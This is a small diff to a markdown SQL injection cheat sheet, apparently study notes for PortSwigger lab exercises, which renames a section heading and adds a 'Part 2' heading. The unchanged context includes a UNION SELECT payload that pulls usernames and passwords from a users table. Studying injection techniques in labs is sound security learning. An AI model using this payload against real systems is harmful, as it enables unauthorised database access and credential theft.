@@ -177,7 +177,7 @@ etc...
 ```
 - [Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
 
-## Listing the database contents on non-Oracle databases
+## Listing the database contents on non-Oracle databases (Part 1)
 
 1. Determinate the name of the databases
 ```sql
@@ -200,3 +200,5 @@ etc...
 ```sql
 ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
 ```
+
+## Listing the database contents on non-Oracle databases (Part 2)
